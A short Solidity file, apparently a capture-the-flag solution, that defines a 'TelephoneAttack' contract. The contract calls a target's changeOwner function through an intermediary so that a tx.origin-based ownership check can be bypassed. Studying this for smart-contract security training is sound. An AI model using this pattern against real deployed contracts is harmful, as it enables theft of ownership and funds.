// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract TelephoneAttack {
    address public telephoneAddress;

    constructor(address _telephoneAddress) {
        telephoneAddress = _telephoneAddress;
    }

    function changeOwnerWithoutABI(address _newOwner) public {
        bytes memory payload =
            abi.encodeWithSignature("changeOwner(address)", _newOwner);
        (bool success, ) = telephoneAddress.call(payload);
        require(success);
    }
}
